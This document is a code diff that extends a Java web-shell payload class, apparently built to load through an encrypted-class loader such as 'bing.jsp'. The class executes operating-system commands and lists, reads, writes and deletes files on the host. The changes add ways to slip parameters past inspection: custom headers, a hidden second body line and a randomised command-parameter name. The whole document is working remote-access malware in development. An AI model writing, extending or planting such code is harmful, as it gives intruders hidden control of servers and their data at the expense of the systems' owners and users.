@@ -1,21 +1,94 @@
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 import java.io.*;
+import java.net.URLDecoder;
 import java.text.SimpleDateFormat;
 import java.util.Base64;
 import java.util.Date;
+import java.util.Map;
 import java.util.Properties;
 
 public class M {
+    /** 优先 _bp，其次 _bl2（body 第二行，bing.jsp 兼容），再次 header，getQueryString，最后 getParameter */
+    @SuppressWarnings("unchecked")
+    private static String getParam(HttpServletRequest req, String name) {
+        Object cache = req.getAttribute("_bp");
+        if (cache instanceof Map) {
+            String v = ((Map<String, String>) cache).get(name);
+            if (v != null) return v;
+        }
+        Map<String, String> bl2 = _fromBodyLine2(req);
+        if (bl2 != null) {
+            String v = bl2.get(name);
+            if (v != null) return v;
+        }
+        if ("a".equals(name)) { String v = req.getHeader("X-A"); if (v != null) return v; }
+        if ("_k".equals(name)) { String v = req.getHeader("X-K"); if (v != null) return v; }
+        if ("path".equals(name)) { String v = req.getHeader("X-Path"); if (v != null) return v; }
+        if ("data".equals(name)) { String v = req.getHeader("X-Data"); if (v != null) return v; }
+        String k = req.getHeader("X-K");
+        if (k != null && k.equals(name)) { String v = req.getHeader("X-V"); if (v != null) return v; }
+        String v = _fromQueryString(req, name);
+        if (v != null) return v;
+        return req.getParameter(name);
+    }
+
+    /** bing.jsp 兼容：payload 读第一行（加密 class），第二行为 a=exec&_k=xxx&xxx=cmd，getReader 可继续读 */
+    @SuppressWarnings("unchecked")
+    private static Map<String, String> _fromBodyLine2(HttpServletRequest req) {
+        Object cached = req.getAttribute("_bl2");
+        if (cached instanceof Map) return (Map<String, String>) cached;
+        Map<String, String> bl2 = new java.util.HashMap<>();
+        try {
+            String line2 = req.getReader().readLine();
+            if (line2 != null && !line2.isEmpty()) {
+                for (String pair : line2.split("&")) {
+                    int eq = pair.indexOf('=');
+                    if (eq > 0) {
+                        String k = URLDecoder.decode(pair.substring(0, eq).trim(), "UTF-8");
+                        bl2.put(k, URLDecoder.decode(pair.substring(eq + 1), "UTF-8"));
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+        req.setAttribute("_bl2", bl2);
+        return bl2;
+    }
+
+    /** getQueryString 解析 */
+    private static String _fromQueryString(HttpServletRequest req, String name) {
+        try {
+            String qs = req.getQueryString();
+            if (qs == null || qs.isEmpty()) return null;
+            for (String pair : qs.split("&")) {
+                int eq = pair.indexOf('=');
+                if (eq > 0) {
+                    String k = URLDecoder.decode(pair.substring(0, eq).trim(), "UTF-8");
+                    if (name.equals(k)) return URLDecoder.decode(pair.substring(eq + 1), "UTF-8");
+                }
+            }
+        } catch (Exception ignored) {}
+        return null;
+    }
     @Override
     public boolean equals(Object obj) {
         try {
-            Object[] ctx = (Object[]) obj;
-            HttpServletRequest req = (HttpServletRequest) ctx[0];
-            HttpServletResponse res = (HttpServletResponse) ctx[1];
+            HttpServletRequest req;
+            HttpServletResponse res;
+            if (obj instanceof Object[]) {
+                Object[] ctx = (Object[]) obj;
+                req = (HttpServletRequest) ctx[0];
+                res = (HttpServletResponse) ctx[1];
+            } else {
+                Object pc = obj;
+                Object reqObj = pc.getClass().getMethod("getRequest").invoke(pc);
+                Object resObj = pc.getClass().getMethod("getResponse").invoke(pc);
+                req = (HttpServletRequest) reqObj;
+                res = (HttpServletResponse) resObj;
+            }
             res.setCharacterEncoding("UTF-8");
 
-            String action = req.getParameter("a");
+            String action = getParam(req, "a");
             if (action == null || action.length() == 0) {
                 action = "ping";
             }
@@ -58,7 +131,19 @@ public class M {
             }
 
             res.getWriter().print(out);
-        } catch (Exception ignored) {
+        } catch (Exception e) {
+            try {
+                Object r;
+                if (obj instanceof Object[]) {
+                    r = ((Object[]) obj)[1];
+                } else {
+                    Object pc = obj;
+                    r = pc.getClass().getMethod("getResponse").invoke(pc);
+                }
+                ((HttpServletResponse) r).getWriter()
+                    .print("MATRIX_ERR:" + e.getClass().getName() + ":"
+                        + (e.getMessage() != null ? e.getMessage() : ""));
+            } catch (Throwable ignored) {}
         }
         return true;
     }
@@ -66,9 +151,9 @@ public class M {
     private String handleExec(HttpServletRequest req) {
         try {
             // _k 传入实际命令参数名（随机32位16进制），fallback 到 ecmd
-            String key = req.getParameter("_k");
+            String key = getParam(req, "_k");
             if (key == null || key.isEmpty()) key = "ecmd";
-            String cmd = req.getParameter(key);
+            String cmd = getParam(req, key);
             if (cmd == null) cmd = "";
             String os = System.getProperty("os.name").toLowerCase();
             String[] commands;
@@ -95,7 +180,7 @@ public class M {
     }
 
     private String handleLs(HttpServletRequest req) {
-        String path = req.getParameter("path");
+        String path = getParam(req, "path");
         if (path == null || path.length() == 0) path = ".";
         File dir = new File(path);
         if (!dir.exists() || !dir.isDirectory()) {
@@ -119,7 +204,7 @@ public class M {
     }
 
     private String handleCat(HttpServletRequest req) throws IOException {
-        String path = req.getParameter("path");
+        String path = getParam(req, "path");
         if (path == null) path = "";
         File f = new File(path);
         if (!f.exists() || !f.isFile() || !f.canRead()) {
@@ -129,8 +214,8 @@ public class M {
     }
 
     private String handleWrite(HttpServletRequest req) throws IOException {
-        String path = req.getParameter("path");
-        String data = req.getParameter("data");
+        String path = getParam(req, "path");
+        String data = getParam(req, "data");
         if (path == null || data == null) return "0";
         byte[] bytes = Base64.getDecoder().decode(data);
         FileOutputStream fos = null;
@@ -150,7 +235,7 @@ public class M {
     }
 
     private String handleRm(HttpServletRequest req) {
-        String path = req.getParameter("path");
+        String path = getParam(req, "path");
         if (path == null) return "0";
         File f = new File(path);
         return f.delete() ? "1" : "0";
